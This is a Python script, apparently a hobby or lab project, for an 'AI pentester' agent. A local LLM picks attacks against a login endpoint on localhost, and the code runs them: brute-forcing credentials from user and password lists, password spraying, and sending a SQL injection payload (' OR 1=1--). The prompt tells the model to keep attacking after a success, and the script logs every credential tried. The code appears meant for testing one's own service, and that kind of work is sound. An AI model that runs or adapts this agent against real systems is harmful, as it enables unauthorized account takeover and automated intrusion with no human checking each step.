import requests
import ollama
import json
import time

TARGET = "http://localhost:8000/auth/login"


class PentestAgent:

    def __init__(self):
        self.model = "qwen3"
        self.history = []

        self.users = self.load_list("users.txt")
        self.passwords = self.load_list("passwords.txt")

    def load_list(self, filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
        except:
            print(f"Не удалось загрузить {filename}")
            return []

    # ================= LLM =================

    def ask_llm(self, prompt):
        response = ollama.chat(
            model=self.model,
            messages=[{"role": "user", "content": prompt}]
        )
        return response["message"]["content"]

    def decide_next_action(self):

        prompt = f"""
        Ты AI pentester.

        Цель: протестировать endpoint /login

        Уже выполнено:
        {self.history}

        Доступные действия:
        - bruteforce
        - password_spray
        - sql_injection
        - finish

        ВАЖНО:
        - пользователи и пароли есть в списках
        - ты можешь выбрать:
          - одного пользователя
          - один пароль
          - или весь список
        - Надо проверить всех пользователей
        - Если успешная атака, то продолжай работать, пока не будут выполнены все атаки

        Доступные пользователи:
        {self.users}

        Доступные пароли:
        {self.passwords}

        Отвечай строго JSON:

        {{
          "action": "...",
          "params": {{
            "mode": "all | single_user | single_password",
            "username": "...",
            "password": "...",
            "payload": "..."
          }},
          "reason": "..."
        }}
        """

        response = self.ask_llm(prompt)

        try:
            return json.loads(response)
        except:
            print("Ошибка парсинга LLM:", response)
            return {"action": "finish"}

    # ================= CORE =================

    def run(self):

        print("🚀 Запуск AI pentest агента\n")

        while True:

            decision = self.decide_next_action()

            action = decision.get("action")
            params = decision.get("params", {})

            print(f"\nДействие: {action}")
            print(f"Причина: {decision.get('reason')}")

            if action == "finish":
                print("\nТест завершен")
                break

            result = self.execute_tool(action, params)

            self.history.append({
                "action": action,
                "result": result[:300]
            })

            print("Результат:\n", result)

            time.sleep(1)

    # ================= TOOLS =================

    def execute_tool(self, action, params):

        if action == "bruteforce":
            return self.bruteforce(params)

        elif action == "password_spray":
            return self.password_spray(params)

        elif action == "sql_injection":
            return self.sql_injection(params)

        return "unknown action"

    # ================= HTTP =================

    def send_request(self, username, password):

        payload = {
            "username": username,
            "password": password
        }

        r = requests.post(
            TARGET,
            json=payload,
            headers={
                "accept": "application/json",
                "Content-Type": "application/json"
            }
        )

        return {
            "status": r.status_code,
            "text": r.text[:500],
            "raw": r.text
        }

    # ================= LOGIN DETECT =================

    def is_login_success(self, response):

        text = response["text"].lower()
        status = response["status"]

        success_indicators = ["dashboard", "logout", "welcome"]
        fail_indicators = ["invalid", "error", "incorrect", "failed"]

        if status in [401, 403]:
            return False

        if any(word in text for word in success_indicators):
            return True

        if any(word in text for word in fail_indicators):
            return False

        return status == 200

    # ================= LOGGING =================

    def log_result(self, attack_type, username, password, success):

        with open("pentest_log.txt", "a", encoding="utf-8") as f:
            f.write(
                f"{attack_type} | user={username} | pass={password} | success={success}\n"
            )

    # ================= ATTACKS =================

    def bruteforce(self, params):

        mode = params.get("mode", "all")
        username = params.get("username")

        results = []

        users = self.users

        if mode == "single_user" and username in self.users:
            users = [username]

        for user in users:
            for pwd in self.passwords:

                res = self.send_request(user, pwd)
                success = self.is_login_success(res)

                self.log_result("bruteforce", user, pwd, success)

                results.append(f"{user}:{pwd} -> {success}")

                if success:
                    results.append("УСПЕШНЫЙ ВХОД!")
                    return "\n".join(results)

        return "\n".join(results)

    def password_spray(self, params):

        mode = params.get("mode", "all")
        password = params.get("password")

        results = []

        passwords = self.passwords

        if mode == "single_password" and password in self.passwords:
            passwords = [password]

        for pwd in passwords:
            for user in self.users:

                res = self.send_request(user, pwd)
                success = self.is_login_success(res)

                self.log_result("password_spray", user, pwd, success)

                results.append(f"{user}:{pwd} -> {success}")

                if success:
                    results.append("НАЙДЕН ПАРОЛЬ!")
                    return "\n".join(results)

        return "\n".join(results)

    def sql_injection(self, params):

        payload = params.get("payload", "' OR 1=1--")

        res = self.send_request(payload, payload)
        success = self.is_login_success(res)

        self.log_result("sql_injection", payload, payload, success)

        return f"{payload} -> success={success} status={res['status']}"


# ================= RUN =================

if __name__ == "__main__":
    agent = PentestAgent()
    agent.run()
